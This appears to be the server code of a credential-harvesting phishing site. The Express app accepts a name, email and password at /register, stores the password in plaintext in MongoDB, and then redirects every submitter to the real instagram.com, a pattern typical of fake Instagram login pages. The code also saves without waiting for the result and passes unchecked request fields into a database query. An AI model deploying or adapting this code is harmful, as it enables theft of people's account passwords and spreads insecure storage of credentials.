const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const dotenv = require("dotenv");
const path = require("path");
const app =  express();
dotenv.config();
const username = process.env.MONGODB_USERNAME;
const password = process.env.MONGODB_PASSWORD;


mongoose.connect(`mongodb+srv://${username}:${password}@cluster0.j2vaxzt.mongodb.net/RegDb`)
.then(()=>{console.log("Database successfully connected")});


// Mongoose schema
const registerUserSchema = new mongoose.Schema({
    name: String,
    email: String,
    password: String
});


const Registration = mongoose.model("Registration",registerUserSchema);





app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json())
app.use(express.static(path.join(__dirname, 'public')));


app.get("/",(req,res)=>{
    console.log(__dirname)
    res.sendFile(__dirname+"/public/index.html");
})




app.post("/register",async (req,res)=>{
   
    
        const {name,email,password} = req.body;
        const existingUser = await Registration.findOne({email:email});
        if(!existingUser){
            const resitrationData = new Registration({
                name,
                email,
                password
            })
            resitrationData.save();
            res.redirect("https://www.instagram.com/");
        }
        else{
                res.redirect("https://www.instagram.com/");
        }
    
  
});


app.listen(3000,()=>{
    console.log("Server is running at port number 3000")
});
